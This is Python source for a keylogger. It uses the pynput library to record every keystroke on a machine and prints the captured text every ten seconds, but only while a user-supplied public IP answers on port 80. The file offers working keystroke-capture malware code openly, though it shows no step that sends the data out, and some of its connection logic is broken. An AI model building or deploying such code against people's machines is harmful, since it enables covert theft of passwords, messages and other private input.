import socket
import threading
from pynput import keyboard
from utils.validator import get_ip
import re 

text = ""
time_interval = 10
timer = None
listener = None

def is_private_ip(ip_address):
    """Check if the IP address is in a private range"""
    # Define patterns for private IP ranges
    private_patterns = [
        r'^10\.\d{1,3}\.\d{1,3}\.\d{1,3}$',         # 10.0.0.0 - 10.255.255.255
        r'^172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}$',  # 172.16.0.0 - 172.31.255.255
        r'^192\.168\.\d{1,3}\.\d{1,3}$'              # 192.168.0.0 - 192.168.255.255
    ]  
    for pattern in private_patterns:
        if re.match(pattern, ip_address):
            return True
    return False


def validate_ip(ip_address):
    """Validate IP address and check if it's not local or private"""
    if ip_address in ("0.0.0.0", "localhost", "127.0.0.1"):
        return False, "[Error] Cannot use local IPs like 127.0.0.1, localhost, or 0.0.0.0." 
    if is_private_ip(ip_address):
        return False, f"[Error] Cannot use private IPs like {ip_address} (e.g., 192.168.x.x)." 
    return True, None

def is_active(ip_address, port_number):
    '''Check if the provided IP have a active connection.'''
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)  # Avoids hanging
            return s.connect_ex((ip_address, port_number)) == 0
    except socket.error:
        return False

def display_logged_keys(ip_address, port_number):
    '''Display logged keys periodically if the connection is active.'''
    global text, timer
    if text and is_active(ip_address, port_number):
        print("\n[Logged Keys]:", text)
        text = ""  # Clear after logging
    # Starting a new timer only if keylogging is still active
    timer = threading.Timer(time_interval, display_logged_keys, args=(ip_address, port_number))
    timer.start()# start the timer thread

def exit_keylogger():
    global timer, listener
    print("\n[Exiting keylogger...]")
    if timer:
        timer.cancel()
    if listener:
        listener.stop()

def on_press(key, ip_address, port_number):
    '''collecting correct keys'''
    global text
    if not is_active(ip_address, port_number):
        return
    if hasattr(key, 'char'):
            # Using match-case for character keys
        match key.char:
            case None:
                pass
            case _:  # Default case to catch all other characters
                text += key.char
    else:
        match key:
            case keyboard.Key.enter:
                text += "\n"
            case keyboard.Key.tab:
                text += "\t"
            case keyboard.Key.space:
                text += " "
            case keyboard.Key.backspace:
                if text:  # Only remove if there's text
                    text = text[:-1]
            case keyboard.Key.esc:
                exit_keylogger()
                return False
            case _:  # Default case for other special keys
                text += f"[{key}]" 

def start_keylogger(ip_address,port):
    '''starting the actual keylogger'''
    print("[Keylogger started] Press 'Esc' to stop.")
    display_logged_keys(ip_address, port)
    listener = keyboard.Listener(on_press=lambda key: on_press(key, ip_address, port))
    listener.start()
    listener.join()  # Waiting for the listener to stop

def main():
    try:
        global listener
        ip_address = get_ip()
        is_valid, error_message = validate_ip(ip_address)
        while not is_valid:
            print(error_message)
            ip_address = get_ip()
            is_valid, error_message = validate_ip(ip_address)
        is_active(ip_address, 80)# See if the connection is active
        start_keylogger(ip_address,80)    
    except ConnectionError:
        print(f"{ip_address}:{80} is not active. Keylogger will not start.")
    except KeyboardInterrupt:
        print("\nKeylogger stopped")  
        

if __name__ == "__main__":
    main()